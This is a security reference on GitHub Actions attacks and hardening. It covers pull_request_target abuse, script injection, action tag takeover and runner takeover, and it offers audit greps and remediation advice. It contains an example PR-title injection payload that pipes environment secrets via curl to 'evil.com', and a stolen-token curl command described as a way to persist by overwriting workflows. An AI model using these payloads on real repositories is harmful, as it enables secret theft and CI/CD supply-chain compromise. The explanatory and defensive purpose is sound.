# GitHub Actions Security

> `pull_request_target` abuse, secret exposure, runner takeover, third-party action poisoning. Authorized testing only. Map: OWASP Top 10 CI/CD Security Risks.

## TL;DR
- `pull_request` runs on the PR's HEAD with no access to repository secrets — safe default.
- `pull_request_target` runs on the **base** branch's workflow file but in the context of the **repo's secrets** — combine with `actions/checkout` of the PR head and you've handed a fork-PR author RCE in your CI with secrets.
- `workflow_run` and `pull_request_target` are the two events where a fork PR + a buggy workflow becomes a critical supply-chain finding.
- Self-hosted runners on public repos are RCE-as-a-service unless the runner is single-job + ephemeral.
- Map: OWASP CI/CD-SEC-04 Poisoned Pipeline Execution. See [./poisoned-pipeline-execution.md](./poisoned-pipeline-execution.md).

## Detection / Discovery

### Audit your own workflows
```bash
# Find dangerous event triggers
grep -rEn "on: *(pull_request_target|workflow_run)" .github/workflows/

# Find checkout of PR head with secrets in scope
grep -rEn "actions/checkout@" .github/workflows/ | grep -v 'ref:'

# Third-party actions pinned by tag (not by SHA)
grep -rEn "uses: [^@]+@v[0-9]+" .github/workflows/

# `script-injection` candidates: github.event.* expressions inside run blocks
grep -rEn '\$\{\{ *github\.event\.' .github/workflows/
```

### Audit a third party
- StepSecurity's "secure-repo" (https://www.stepsecurity.io/) detects most known issues.
- `actionlint` (https://github.com/rhysd/actionlint) static-analysis pass.

## Exploitation

### `pull_request_target` + checkout of PR head
Vulnerable pattern:
```yaml
on: pull_request_target          # triggers from forks, in base-branch context, with secrets
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
      with:
        ref: ${{ github.event.pull_request.head.sha }}   # CHECKOUT FORK CODE
    - run: npm install && npm test                       # arbitrary code execution
```
Attacker opens a PR from a fork with a malicious `npm install` postinstall — `secrets.GITHUB_TOKEN` and any other secret in scope leaks.

### Script injection (CWE-94) in `run:` blocks
```yaml
- name: Greet
  run: echo "Hello ${{ github.event.pull_request.title }}"
```
PR title `"; curl evil.com/$(env | base64) #` → command injection in the shell rendered by the runner.

Fix: pass via env var, never inline:
```yaml
- name: Greet
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Hello $PR_TITLE"
```

### `workflow_run` race
`workflow_run` triggers a follow-up job *after* a primary workflow completes. The follow-up runs in the base-branch context with secrets. If the primary uploads an artifact built from PR code, the follow-up downloading + executing that artifact has the same problem as `pull_request_target`.

### Tag-pinned third-party action takeover
`uses: foo/bar@v1` resolves to whatever commit the tag currently points at. Attacker takes over `foo/bar` (compromised maintainer creds, expired domain, malicious co-maintainer) → re-tags `v1` to a malicious commit → next CI run pulls the malicious version.

Pin by full commit SHA + dependabot to refresh:
```yaml
uses: foo/bar@8d9e3f...   # explicit commit
```

### Self-hosted runner takeover
Default self-hosted runners on public repos take any job from any branch. A fork PR can spawn a malicious workflow on your runner — full RCE on whatever the runner has access to (cloud SAs, network paths, build artifacts).

Mitigations:
- Single-job (`--ephemeral`) + auto-recycled VM.
- Runner network in a dedicated VPC with egress allowlist.
- Don't enable self-hosted on public repos. Use GitHub-hosted, or runners-on-demand with image attestation.

### Secret extraction from `GITHUB_TOKEN`
A leaked `GITHUB_TOKEN` carries the workflow's permissions (`permissions:` block). Default-permissions on legacy repos: `write-all`. Modern default: read content + write checks. Even read-content + write-actions is enough to push a workflow change in some configs.

Use:
```bash
# Inside an exploited runner
curl -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/<owner>/<repo>/contents/.github/workflows/cron.yml
# PUT to overwrite -> push a malicious workflow -> persist
```

## Bypasses
- Workflow `if:` guards that compare `github.actor` — actor can be spoofed via `pull_request_target` from a fork that the actor pretends to be (in title / body); the actor value itself is GitHub-authenticated but check expressions matching tactics (e.g., string match on author email in `commit.author.email`) are bypassable by signed-commit spoofing on the fork.
- `permissions:` block missing → inherits repo default (often `write-all`).
- Branch protection requires reviews on `main` but not on `.github/workflows/` paths — attacker pushes a workflow change to a feature branch that gets auto-deployed on push.

## Defence / Remediation
- **Default to `pull_request`, not `pull_request_target`**. If you absolutely need PR-source code with secrets (e.g., review-bot writing a comment), split into two workflows: a `pull_request` that builds without secrets and uploads an artifact, and a `workflow_run` that downloads + reads the artifact metadata (not executing code) and posts with secrets.
- **Pin third-party actions by SHA**. Dependabot can refresh; manual code review per bump.
- **Set `permissions:` explicitly** at job or workflow level — least privilege. `permissions: read-all` is a strong starting baseline.
- **No `secrets:` in fork-PR-triggered workflows**. If a workflow needs an external token (Codecov, etc.), use OIDC-issued cloud tokens (`id-token: write`) instead of static secrets where possible.
- **Script-inject everywhere**: pass user input via `env:`, never inline in `run:` blocks.
- **OpenSSF Scorecard** in CI for repo posture monitoring.
- **Self-hosted runners**: ephemeral mode, dedicated network, never on public repos.
- **`CODEOWNERS` on `.github/`** so workflow changes require platform-team review.
- **Branch protection** including `.github/workflows/`.

## Sources
- GitHub Docs — Security hardening for GitHub Actions: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- GitHub Security Lab — pwn-request attack: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- OWASP Top 10 CI/CD Security Risks: https://owasp.org/www-project-top-10-ci-cd-security-risks/
- actionlint: https://github.com/rhysd/actionlint
- StepSecurity (commercial but free OSS scanner): https://www.stepsecurity.io/
- OpenSSF Scorecard: https://scorecard.dev/
- Dawid Czagan — GitHub Actions write-ups: https://github.com/orgs/community/discussions/categories/actions
